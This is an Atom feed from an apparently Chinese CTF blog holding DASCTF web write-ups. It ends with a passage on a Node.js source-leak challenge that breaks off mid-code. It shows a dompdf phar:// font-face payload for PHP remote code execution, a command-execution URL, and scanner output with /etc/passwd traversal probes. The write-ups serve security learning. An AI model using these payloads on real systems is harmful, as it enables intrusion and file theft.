class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>然后直接访问1.php?0=ls就行了</p><p>参考文章 <a href="https://blog.csdn.net/mochu7777777/article/details/130309288?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168251168616800186547875%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168251168616800186547875&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-130309288-null-null.142^v86^control_2,239^v2^insert_chatgpt&amp;utm_term=pdf_converter_revenge&amp;spm=1018.2226.3001.4187">think PHP pdf rce</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezjxpath&quot;&gt;&lt;a href=&quot;#ezjxpath&quot; class=&quot;headerlink&quot; title=&quot;ezjxpath&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezjxpath&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;cve-2022-41852&lt;/stron</summary>
      
    
    
    
    
    <category term="DASCTF WEB" scheme="https://ke1nys.github.io/tags/DASCTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://ke1nys.github.io/posts/0.html"/>
    <id>https://ke1nys.github.io/posts/0.html</id>
    <published>2023-04-23T07:57:55.724Z</published>
    <updated>2023-04-26T13:05:32.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DAS4-你听说过-js-的-webshell-吗的解题思路"><a href="#DAS4-你听说过-js-的-webshell-吗的解题思路" class="headerlink" title="DAS4-你听说过 js 的 webshell 吗的解题思路"></a>DAS4-你听说过 js 的 webshell 吗的解题思路</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><div class="table-container"><table><thead><tr><th>题目名</th><th>类型</th><th>难度</th></tr></thead><tbody><tr><td>DAS4-你听说过 js 的 webshell 吗</td><td>WEB</td><td>困难</td></tr></tbody></table></div><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>DASCTF{test_flag}</li></ul><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>代码审计 nodejs</li><li>命令执行</li><li>nodejs 源代码泄漏</li><li>coding 其他 git 托管凭据泄漏</li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>打开网页</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854079283-9b8e55a1-6827-42f8-9b80-4041b8bfdffa.png" alt="截屏2022-12-03 23.22.05"></p><p>直接打开 f12 发现 api 与注释</p><p><img src="https://c.img.dasctf.com/images/2023315/1678854085904-9310bb97-3f6a-4a2a-9a65-dd99779867a7.png" alt="截屏2022-12-03 23.22.45"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>这里其实想说的是扫描该网站 看看有没有发现</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://127.0.0.1 <span class="comment"># 这里不需要引入任何字典 泄漏的文件相当常见</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2.8</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11458</span><br><span class="line"></span><br><span class="line">Output File: /tmp/reports/</span><br><span class="line"></span><br><span class="line">Target: http://127.0.0.1/</span><br><span class="line"></span><br><span class="line">[23:23:56] Starting:</span><br><span class="line">[23:23:56] 403 -    9B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:23:56] 403 -    9B  - /%2e%2e//google.com</span><br><span class="line">[23:23:58] 400 -   14B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[23:24:00] 200 -  679B  - /app.js</span><br><span class="line">[23:24:01] 403 -    9B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">[23:24:02] 200 -  439B  - /config.js</span><br><span class="line">[23:24:03] 200 -  170B  - /Dockerfile</span><br><span class="line">[23:24:07] 200 -  627B  - /package.json</span><br><span class="line">[23:24:07] 200 -   29KB - /package-lock.json</span><br><span class="line">[23:24:08] 200 -    9B  - /Readme.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.md</span><br><span class="line">[23:24:08] 200 -    9B  - /README.MD</span><br><span class="line">[23:24:08] 200 -    9B  - /ReadMe.md</span><br><span class="line">[23:24:08] 200 -    9B  - /readme.md</span><br><span class="line">[23:24:12] 200 -    6KB - /views</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><h3 id="入口点发现"><a href="#入口点发现" class="headerlink" title="入口点发现"></a>入口点发现</h3><p>发现存在相关的 js web 文件 尝试查看是否有其他泄漏。</p><ul><li><p>app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span>        = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyparser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span>     = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> cors       = <span class="built_in">require</span>(<span class="string">&#x27;./cors&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> template   = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/template&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> route      = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/route&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> api        = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/api&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> listen     = <span class="built_in">require</span>(<span class="string">&#x27;./middlewares/listen&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> production = process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app        = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">template</span>(<span class="string">&#x27;views&#x27;</span>, &#123;</span><br><span class="line">        <span class="comment">// noCache: !production,</span></span><br><span class="line">        <span class="comment">// watch  : !production</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyparser)</span><br><span class="line">    .<span class="title function_">use</span>(cors)</span><br><span class="line">    .<span class="title function_">use</span>(route)</span><br><span class="line">    .<span class="title function_">use</span>(api)</span><br><span class="line"></span><br><span class="line"><span class="title function_">listen</span>(app)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>package.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;updater&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt; v0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;axios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.21.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.13.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-bodyparser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-router&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^9.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-sslify&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.0.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa-static&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;koa2-cors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nunjucks&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.2&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;prod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pm2 start ecosystem.config.js --env production&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Readme</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># updater</span><br></pre></td></tr></table></figure></li><li><p>config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = &#123;</span><br><span class="line">    <span class="attr">server</span>: &#123;</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;test.example.com&#x27;</span>,</span><br><span class="line">        <span class="attr">pact</span>: <span class="string">&#x27;https&#x27;</span>,</span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="string">&#x27;443&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">coding</span>: &#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&#x27;test@test.com&#x27;</span>,</span><br><span class="line">        <span class="attr">password</span>: <span class="string">&#x27;IAmTheCodeMaster&#x27;</span>,</span><br><span class="line">        <span class="attr">apiKey</span>: <span class="string">&#x27;flag&#123;This is fake flag&#125;:-)&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;development&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">pact</span> = <span class="string">&#x27;http&#x27;</span>,</span><br><span class="line">    <span class="variable constant_">CONFIG</span>.<span class="property">server</span>.<span class="property">port</span> = <span class="string">&#x27;80&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="variable constant_">CONFIG</span></span><br></pre></td></tr></table></figure><p>这里提到了 coding 还有用户名密码 （假的）并不知道 coding 是什么的情况下。 网站也没有登陆口。</p></li><li><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">16</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install &amp;&amp; npm install -g pm2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">443</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;pm2-runtime&quot;</span>, <span class="string">&quot;/app/ecosystem.config.js&quot;</span>, <span class="string">&quot;--env&quot;</span>, <span class="string">&quot;production&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>这里所有的证据都说明了 这个网站泄漏了源代码 也就是 js 文件 </p><p>接下来测试是否存在 ecosystem.config.js 文件 来验证这个结论</p><p>我们可以试试 <a href="https://127.0.0.1/ecosystem.config.js">https://127.0.0.1/ecosystem.config.js</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Options reference: https://pm2.keymetrics.io/docs/usage/application-declaration/</span></span><br><span class="line">const package = require(&#x27;./package.json&#x27;)</span><br><span class="line"></span><br><span class="line">module.exports = <span class="punctuation">&#123;</span></span><br><span class="line">    apps<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        name               <span class="punctuation">:</span> package.name<span class="punctuation">,</span></span><br><span class="line">        script             <span class="punctuation">:</span> &#x27;app.js&#x27;<span class="punctuation">,</span></span><br><span class="line">        args               <span class="punctuation">:</span> &#x27;one two&#x27;<span class="punctuation">,</span></span><br><span class="line">        instances          <span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        autorestart        <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        watch              <span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        ignore_watch       <span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;node_modules&#x27;<span class="punctuation">,</span> &#x27;logs&#x27;<span class="punctuation">,</span> &#x27;.git&#x27;<span class="punctuation">,</span> &#x27;statics&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        error_file         <span class="punctuation">:</span> &#x27;logs/err.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        out_file           <span class="punctuation">:</span> &#x27;logs/out.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_file           <span class="punctuation">:</span> &#x27;logs/all.log&#x27;<span class="punctuation">,</span></span><br><span class="line">        log_date_format    <span class="punctuation">:</span> &#x27;YYYY-MM-DD HH<span class="punctuation">:</span>mm<span class="punctuation">:</span>ss&#x27;<span class="punctuation">,</span></span><br><span class="line">        max_memory_restart <span class="punctuation">:</span> &#x27;<span class="number">1</span>G&#x27;<span class="punctuation">,</span></span><br><span class="line">        env<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;development&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        env_production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            NODE_ENV       <span class="punctuation">:</span> &#x27;production&#x27;<span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    deploy<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        production<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="comment">// host          : CONFIG.remote.host,</span></span><br><span class="line">            <span class="comment">// user          : CONFIG.remote.user,</span></span><br><span class="line">            <span class="comment">// path          : CONFIG.remote.path,</span></span><br><span class="line">            <span class="comment">// repo          : CONFIG.git.ssh,</span></span><br><span class="line">            <span class="comment">// ref           : CONFIG.git.ref,</span></span><br><span class="line">            &#x27;post-deploy&#x27; <span class="punctuation">:</span> &#x27;npm install &amp;&amp; pm2 reload ecosystem.config.js --env production&#x27;</span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span>;</span><br></pre></td></tr></table></figure><p>很明显是存在 js 代码泄漏的</p><h3 id="检查-middleware"><a href="#检查-middleware" class="headerlink" title="检查 middleware"></a>检查 middleware</h3><p>通过 app.js 文件</p><p>可以翻找到 如下的库与中间件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const template   = require(&#x27;./middlewares/template&#x27;)</span><br><span class="line">const route      = require(&#x27;./middlewares/route&#x27;)</span><br><span class="line">const api        = require(&#x27;./middlewares/api&#x27;)</span><br><span class="line">const listen     = require(&#x27;./middlewares/listen&#x27;)</span><br></pre></td></tr></table></figure><p>api listen route template 四个分别通过依赖注入的方式引入</p><p>这里直接去看 api </p><p>对于 api 分别尝试这三个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/middlewares/api.js</span><br><span class="line">https://127.0.0.1/middlewares/api</span><br><span class="line">https://127.0.0.1/middlewares/api/index.js</span><br></pre></td></tr></table></figure><p>可以发现 index.js 有返回</p><p>如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs       = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path     = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router   = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> tools    = <span class="built_in">require</span>(<span class="string">&#x27;../../utils&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Response</span> = <span class="built_in">require</span>(<span class="string">&#x27;../response&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// apiPath 为 当前目录的上上级 也就是 / 下 是可以访问的</span></span><br><span class="line"><span class="keyword">const</span> apiPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../../api&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里是网站自己实现的 CGI </span></span><br><span class="line"><span class="comment">// 动态的在 api 文件夹下所有的 js 文件注册进来 并且赋予对应的 path</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">registeApi</span> (dir) &#123;</span><br><span class="line">    <span class="comment">// 遍历目录下所有文件</span></span><br><span class="line">    fs.<span class="title function_">readdirSync</span>(dir).<span class="title function_">forEach</span>(<span class="function"><span class="params">fileName</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 文件完整路径</span></span><br><span class="line">        <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(dir, fileName)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若该文件为目录，则继续遍历该目录下所有文件</span></span><br><span class="line">        <span class="keyword">if</span> (fs.<span class="title function_">statSync</span>(filePath).<span class="title function_">isDirectory</span>()) <span class="keyword">return</span> <span class="title function_">registeApi</span>(filePath)</span><br><span class="line">        <span class="comment">// 忽略入口文件</span></span><br><span class="line">        <span class="comment">// if (filePath.endsWith(&#x27;index.js&#x27;))       return</span></span><br><span class="line">        <span class="comment">// 忽略非 js 文件</span></span><br><span class="line">        <span class="keyword">if</span> (!filePath.<span class="title function_">endsWith</span>(<span class="string">&#x27;.js&#x27;</span>))           <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;非 JS 文件不要放在 api 目录下&#x27;</span> + filePath)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">regist</span>(filePath);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册单个 api </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">regist</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="comment">// API</span></span><br><span class="line">    <span class="comment">// 通过 filePath 引入</span></span><br><span class="line">    <span class="keyword">const</span> api     = <span class="built_in">require</span>(filePath)</span><br><span class="line">    <span class="comment">// API 名称</span></span><br><span class="line">    <span class="keyword">const</span> apiName = <span class="title function_">getApiName</span>(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历请求方式</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(api)) &#123;</span><br><span class="line">        <span class="comment">// 响应操作 写入 router </span></span><br><span class="line">        router[type](apiName, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> api[type](<span class="title function_">getRequest</span>(ctx), <span class="keyword">new</span> <span class="title class_">Response</span>(ctx))</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// 打印接口信息</span></span><br><span class="line">        <span class="title function_">apiLog</span>(type, apiName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 去掉 .js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getApiName</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> filePath.<span class="title function_">cutEnd</span>(<span class="number">3</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(apiPath, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getRequest</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        params : &#123; ...ctx.<span class="property">request</span>.<span class="property">body</span>, ...tools.<span class="title function_">getUrlParams</span>(ctx.<span class="property">request</span>.<span class="property">url</span>) &#125;,</span><br><span class="line">        page   : tools.<span class="title function_">getPagination</span>(ctx),</span><br><span class="line">        ctx,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">apiLog</span> (type, apiName, apiIntro = <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;apiIntro&#125;</span>\n[<span class="subst">$&#123;type.toUpperCase()&#125;</span>]: <span class="subst">$&#123;apiName&#125;</span>\n****************************************`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// require 时注册 APIPATH</span></span><br><span class="line"><span class="title function_">registeApi</span>(apiPath)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = (<span class="function">() =&gt;</span> router.<span class="title function_">routes</span>())()</span><br></pre></td></tr></table></figure><h3 id="整理逻辑-发现端倪"><a href="#整理逻辑-发现端倪" class="headerlink" title="整理逻辑 发现端倪"></a>整理逻辑 发现端倪</h3><p>在 /api/XXX 下的 任何 /api/path/to/api.js 都会被注册成 /path/to/api </p><p>那么 查看 / 下的所有请求出去的 api 你可以直接 grep 拿到如下的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span 